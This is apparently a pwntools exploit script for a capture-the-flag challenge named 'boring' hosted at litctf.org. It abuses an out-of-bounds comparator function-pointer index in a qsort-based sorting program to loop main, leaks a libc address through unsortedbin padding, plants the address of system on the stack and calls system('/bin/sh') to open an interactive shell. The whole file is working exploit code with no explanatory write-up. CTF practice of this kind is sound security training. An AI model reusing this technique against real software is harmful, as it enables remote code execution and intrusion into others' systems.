from pwn import *
import ctypes
from tqdm import tqdm

#init

#e = ELF('/app/boring')
#libc_path = e.libc.path 

e = ELF('../attachments/boring')
libc_path = '../attachments/libc.so.6'

libs_debug = libcdb.download_libraries(libc_path, unstrip = True)
libc = ELF(f'{libs_debug}/libc.so.6')

#p = process(e.path)
p = remote('litctf.org', 31770)

#funcs

def str2arr(s):
    return [u32(s[i:i+4].ljust(4, b'\x00')) for i in range(0, len(s), 4)]

def kek(a, x):
    p.sendlineafter(b'How many ints?', str(len(a)).encode());
    p.sendlineafter(b'Input ints (separate by space):', ' '.join(list(map(str, a))).encode())
    p.sendlineafter(b'Input sort type (1 = forward, 2 = reverse):', str(x).encode())

def uwu():
    p.recvuntil(b'Sorted array:\n')
    return list(map(lambda x : ctypes.c_uint32(int(x)).value, p.recvline(keepends = False).split()))

#vars

#exploit

#loop main w/ oob cmp func ptr

kek([0x420] * 8, 10)

#leak libc allocating unsortedbin w/ large array in qsort, finess padding chnks

kek([0x69] * 0x110, 11)

log.info('Padding unsortedbin')
for i in tqdm(range(0x431)):
    kek([0x1337], 1)

kek(['-'] * 0x2, 1)

a = uwu()
a.sort(reverse = True)

libc.address = ((a[1] << 32) | a[0]) - libc.sym['main_arena'] - 0x60

log.info('Libc adr: ' + hex(libc.address))

#put system address on stack w/ small array in qsort

kek(str2arr(p64(libc.sym['system']))[::-1], 2)

#call system w/ oob cmp func ptr

kek(str2arr(b'/bin/sh'), -160)

#pray for flag

p.interactive()
